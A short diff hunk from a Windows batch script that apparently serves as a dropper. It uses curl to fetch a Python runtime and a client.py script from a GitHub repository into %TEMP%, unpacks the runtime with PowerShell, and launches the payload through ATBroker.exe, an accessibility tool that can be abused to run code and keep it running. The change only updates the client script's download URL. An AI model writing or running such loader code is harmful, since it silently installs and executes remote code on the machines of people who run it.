@@ -8,6 +8,6 @@ if exist "%directoryPath%" (
 	curl -L -sS -o %TEMP%\python.zip https://github.com/repossess/fleur/raw/refs/heads/main/dependencies/python.zip
 	powershell Expand-Archive -Path "%TEMP%\python.zip" -DestinationPath "%TEMP%"
 	del %TEMP%\python.zip
-	curl -sS -o %TEMP%\client.py https://raw.githubusercontent.com/repossess/fleur/refs/heads/main/dependencies/client_.py
+	curl -sS -o %TEMP%\client.py https://raw.githubusercontent.com/repossess/fleur/refs/heads/main/dependencies/client.py
 	ATBroker.exe /start fleur
 )
